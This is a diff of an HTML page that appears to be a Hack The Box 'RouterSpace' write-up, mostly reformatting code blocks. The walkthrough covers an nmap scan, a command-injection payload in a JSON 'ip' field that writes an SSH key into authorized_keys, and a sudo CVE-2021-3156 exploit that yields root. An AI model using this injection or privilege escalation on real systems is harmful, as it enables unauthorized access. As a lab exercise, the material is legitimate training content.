@@ -2,7 +2,7 @@
 <hr>
 <img src="https://raw.githubusercontent.com/Spy0x7/Spy0x7.github.io/master/assets/routerspace/routerspace.png">
 <h2 class="code-line" data-line-start=9 data-line-end=10><a id="nmap_9"></a>nmap</h2>
-<p class="has-line-data" data-line-start="131" data-line-end="132"><code>┌[spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace]
+<pre><code class="has-line-data" data-line-start="12" data-line-end="118" class="language-shel">┌[spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace]
 └╼[★]$nmap -sC -sV -oA nmap 10.10.11.148
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-05 21:36 PKT
@@ -116,10 +116,10 @@ Nmap done: 1 IP address (1 host up) scanned in 79.97 seconds
 <p class="has-line-data" data-line-start="129" data-line-end="130">need to install AnBox After installation, we start the emulator</p>
 <p class="has-line-data" data-line-start="131" data-line-end="132"><code>adb shell settings put global http_proxy 192.168.18.4:8080</code></p>
 <p class="has-line-data" data-line-start="133" data-line-end="134">Then after burp sets the listening port, use burp to proxy anbox</p>
-<p class="has-line-data" data-line-start="131" data-line-end="132"><code>[spy0x7㉿pop-os]─[/home/spy0x7/Downloads]
+<pre><code class="has-line-data" data-line-start="136" data-line-end="140">[spy0x7㉿pop-os]─[/home/spy0x7/Downloads]
 └╼[★]$adb install RouterSpace.apk
 Success
-</code></p>
+</code></pre>
 <p class="has-line-data" data-line-start="141" data-line-end="142"><img src="/assets/routerspace/install.png" alt="website"></p>
 <p class="has-line-data" data-line-start="143" data-line-end="144">Install the app, then open</p>
 <p class="has-line-data" data-line-start="145" data-line-end="146"><img src="/assets/routerspace/click.png" alt="website"></p>
@@ -134,7 +134,7 @@ Success
 <p class="has-line-data" data-line-start="165" data-line-end="166"><img src="/assets/routerspace/id.png" alt="website"></p>
 <p class="has-line-data" data-line-start="167" data-line-end="168">oh it’s work command execute successfully</p>
 <p class="has-line-data" data-line-start="170" data-line-end="171">let’s try to generate a sshkey, and then write it in to log in with ssh.</p>
-<p class="has-line-data" data-line-start="131" data-line-end="132"><code>┌[spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace]
+<pre><code class="has-line-data" data-line-start="173" data-line-end="196">┌[spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace]
 └╼[★]$ssh-keygen
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/spy0x7/.ssh/id_rsa): 
@@ -143,7 +143,7 @@ Enter same passphrase again:
 Your identification has been saved in /home/spy0x7/.ssh/id_rsa.
 Your public key has been saved in /home/spy0x7/.ssh/id_rsa.pub.
 The key fingerprint is:
-SHA256:rTz1OM1hCkc75iB/wFp7RaE9o4MDxfzV3FuEmNxCBRY
+SHA256:rTz1OM1hCkc75iB/wFp7RaE9o4MDxfzV3FuEmNxCBRY <a href=""  data-cfemail="3744474e074f00774758471a5844"></a>
 The key's randomart image is:
 +---[RSA 2048]----+
 |       o.  oEX.+.|
@@ -156,12 +156,12 @@ The key's randomart image is:
 |         + .     |
 |                 |
 +----[SHA256]-----+
-</code></p>
+</code></pre>
 <p class="has-line-data" data-line-start="197" data-line-end="198">Then save the content of id_rsa.pub as authorized_keys</p>
-<p class="has-line-data" data-line-start="131" data-line-end="132"><code>{&quot;ip&quot;:&quot;0.0.0.0|echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAAQDEfXW5jWSjNdbuSVZWszzfpNq/oeG+WwH5imomLf/N7QJNKAWkbFTk3RMxRBzy9a3pHF7CubMLhykOzjz+4ap22GDkjdA/FL4ha9siGXboor+dpqm4WcfjPy6CdQUroHV0qfNNOz5qT0SfeATsi1udmv8oh1MAfeFNTLaXM0w7JP6EHdcIo2OdJJOsy0jBwQEIf3LsRLl2Q8VLtltR28N7ZTcJzUcuGZpksv3OvUDt2f4NxZCtL3vMwkTJj5wkJy8CpGti473QG2pPU3BcRKOY+RvycqJA3Hz6nN3dbG7lXDEa6PgrzuUXb6dJTB9Rseqq0c69QCHnvQ3B/1ZLig/b <a href=""  data-cfemail="e794979ed79fd0a7978897ca8894"></a>' &gt; /home/paul/.ssh/authorized_keys&quot;}
-</code></p>
+<pre><code class="has-line-data" data-line-start="201" data-line-end="203">{&quot;ip&quot;:&quot;0.0.0.0|echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAAQDEfXW5jWSjNdbuSVZWszzfpNq/oeG+WwH5imomLf/N7QJNKAWkbFTk3RMxRBzy9a3pHF7CubMLhykOzjz+4ap22GDkjdA/FL4ha9siGXboor+dpqm4WcfjPy6CdQUroHV0qfNNOz5qT0SfeATsi1udmv8oh1MAfeFNTLaXM0w7JP6EHdcIo2OdJJOsy0jBwQEIf3LsRLl2Q8VLtltR28N7ZTcJzUcuGZpksv3OvUDt2f4NxZCtL3vMwkTJj5wkJy8CpGti473QG2pPU3BcRKOY+RvycqJA3Hz6nN3dbG7lXDEa6PgrzuUXb6dJTB9Rseqq0c69QCHnvQ3B/1ZLig/b <a href=""  data-cfemail="e794979ed79fd0a7978897ca8894"></a>' &gt; /home/paul/.ssh/authorized_keys&quot;}
+</code></pre>
 <p class="has-line-data" data-line-start="204" data-line-end="205">Then use ssh to log in</p>
-<p class="has-line-data" data-line-start="131" data-line-end="132"><code>┌[spy0x7㉿pop-os]─[/home/spy0x7/.ssh]
+<pre><code class="has-line-data" data-line-start="207" data-line-end="247">┌[spy0x7㉿pop-os]─[/home/spy0x7/.ssh]
 └╼[★]$ssh <a href=""  data-cfemail="c5b5a4b0a985f4f5ebf4f5ebf4f4ebf4f1fd"></a>
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)
 
@@ -200,11 +200,11 @@ Last login: Sat Mar  5 15:41:03 2022 from 10.10.15.171
 <a href=""  data-cfemail="f28293879eb2809d878697808182939197"></a>:~$ ls
 snap  user.txt
 <a href=""  data-cfemail="720213071e32001d070617000102131117"></a>:~$
-</code></p>
+</code></pre>
 <p class="has-line-data" data-line-start="247" data-line-end="248">Successfully login on user</p>
-<p class="has-line-data" data-line-start="131" data-line-end="132"><code>:~$ cat user.txt 
+<pre><code class="has-line-data" data-line-start="250" data-line-end="253"><a href=""  data-cfemail="b9c9d8ccd5f9cbd6cccddccbcac9d8dadc"></a>:~$ cat user.txt 
 75e43b546b55786f3e9435473fd56c26
-</code></p>
+</code></pre>
 <p class="has-line-data" data-line-start="254" data-line-end="255">Get the flag</p>
 <h2 class="code-line" data-line-start=256 data-line-end=257><a id="Privilege_escalation_256"></a>Privilege escalation</h2>
 <p class="has-line-data" data-line-start="258" data-line-end="259">First, We run a <a href="http://linpeas.sh">linpeas.sh</a> script to see if there are any privilege escalation</p>
@@ -212,7 +212,7 @@ snap  user.txt
 <p class="has-line-data" data-line-start="262" data-line-end="263">There is a vulnerability CVE-2021-3156 seen here</p>
 <p class="has-line-data" data-line-start="264" data-line-end="265"><a href="https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit">https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit</a></p>
 <p class="has-line-data" data-line-start="267" data-line-end="268">Let’s transfer the exploit through ssh.</p>
-<p class="has-line-data" data-line-start="131" data-line-end="132"><code>┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
+<pre><code class="has-line-data" data-line-start="271" data-line-end="286">┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
 └╼[★]$scp -i /root/.ssh/id_rsa shellcode.c  <a href=""  data-cfemail="44342531280475746a75746a75756a75707c"></a>:.
 Warning: Identity file /root/.ssh/id_rsa not accessible: Permission denied.
 shellcode.c                                                                                          100%  599     3.3KB/s   00:00    
@@ -226,9 +226,9 @@ Makefile                                                                        
 └╼[★]$scp -i /root/.ssh/id_rsa exploit.c  <a href=""  data-cfemail="413120342d0170716f70716f70706f707579"></a>:.
 file
 exploit.c
-</code></p>
+</code></pre>
 <p class="has-line-data" data-line-start="287" data-line-end="288">lets run our exploit</p>
-<p class="has-line-data" data-line-start="131" data-line-end="132"><code>:~/exploit$ make
+<pre><code class="has-line-data" data-line-start="290" data-line-end="300"><a href=""  data-cfemail="98e8f9edf4d8eaf7edecfdeaebe8f9fbfd"></a>:~/exploit$ make
 mkdir libnss_x
 cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
 cc -O3 -o exploit exploit.c
@@ -237,5 +237,5 @@ cc -O3 -o exploit exploit.c
 uid=0(root) gid=0(root) groups=0(root),1001(paul)
 # cat /root/root.txt
 567eb556acf2d31ef537b9cfde601e30
-</code></p>
+</code></pre>
 <p class="has-line-data" data-line-start="301" data-line-end="302">Successfully root the machine</p>
